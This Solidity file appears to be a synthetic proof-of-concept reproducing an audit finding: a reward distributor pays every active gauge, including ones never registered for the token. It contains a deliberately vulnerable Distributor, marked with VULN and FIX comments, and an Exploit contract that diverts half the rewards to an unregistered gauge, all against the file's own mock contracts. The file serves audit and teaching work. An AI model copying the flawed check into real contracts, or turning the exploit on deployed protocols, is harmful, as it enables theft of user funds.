// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — GaugeRewardsDistributor pays gauges that were never
    registered for the reward token (Pashov, finding #66370)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: distributeRewards copies every active GaugeController gauge
    into the cycle. It never checks gaugeRewardTokens[gauge][token], which
    addGaugeRewardToken is what actually opts a gauge in. An active gauge
    that was not registered still receives half of the balance, and the
    registered gauge receives half of what it was supposed to. */

contract ERC20 {
    string public symbol = "RAAC";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Gauge {
    ERC20 public token;
    address public staker;
    uint256 public credited;

    constructor(ERC20 t, address s) {
        token = t;
        staker = s;
    }

    function notify(uint256 amt) external {
        token.transferFrom(msg.sender, address(this), amt);
        credited += amt;
    }

    function claim() external {
        uint256 amt = token.balanceOf(address(this));
        credited = 0;
        token.transfer(staker, amt);
    }
}

contract Controller {
    address[] internal active;

    function add(address g) external {
        active.push(g);
    }

    function getActiveGauges() external view returns (address[] memory) {
        return active;
    }
}

contract Distributor {
    uint256 public constant MAX_ACTIVE_GAUGES = 100;
    ERC20 public token;
    Controller public controller;
    bool public fixedMode;
    mapping(address => mapping(address => bool)) public gaugeRewardTokens;
    uint256 public activeCycleGauges;
    uint256 public unregisteredPaid;

    constructor(ERC20 t, Controller c, bool fixed_) {
        token = t;
        controller = c;
        fixedMode = fixed_;
    }

    function addGaugeRewardToken(address gauge) external {
        gaugeRewardTokens[gauge][address(token)] = true;
    }

    function distributeRewards() external {
        address[] memory activeGauges = controller.getActiveGauges();
        address[] memory allActiveGauges = new address[](activeGauges.length);
        uint256 count;
        for (uint256 i = 0; i < activeGauges.length; i++) {
            // FIX: if (gaugeRewardTokens[activeGauges[i]][address(token)]) { ... }
            if (!fixedMode || gaugeRewardTokens[activeGauges[i]][address(token)]) {
                allActiveGauges[count] = activeGauges[i]; // @> VULN: every active gauge is paid, registered or not
                count++;
                if (count >= MAX_ACTIVE_GAUGES) break;
            }
        }
        activeCycleGauges = count;
        uint256 share = token.balanceOf(address(this)) / count;
        for (uint256 j = 0; j < count; j++) {
            if (!gaugeRewardTokens[allActiveGauges[j]][address(token)]) {
                unregisteredPaid += share;
            }
            token.approve(allActiveGauges[j], share);
            Gauge(allActiveGauges[j]).notify(share);
        }
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    Gauge public gaugeA; // nonce 2
    Gauge public gaugeB; // nonce 3
    Controller public controller; // nonce 4
    Distributor public dist; // nonce 5
    address public constant VICTIM = address(uint160(0xA11CE));

    constructor() {
        token = new ERC20();
        gaugeA = new Gauge(token, VICTIM);
        gaugeB = new Gauge(token, address(this));
        controller = new Controller();
        dist = new Distributor(token, controller, false);
        controller.add(address(gaugeA));
        controller.add(address(gaugeB));
        dist.addGaugeRewardToken(address(gaugeA));
        token.mint(address(dist), 100 ether);
    }

    function run() external {
        dist.distributeRewards();
        gaugeB.claim();
        require(token.balanceOf(address(this)) == 50 ether, "attacker gauge took 50");
        require(token.balanceOf(address(gaugeA)) == 50 ether, "registered gauge short 50");
        require(dist.unregisteredPaid() == 50 ether, "unregistered was paid");
        require(!dist.gaugeRewardTokens(address(gaugeB), address(token)), "B is not registered");
    }
}
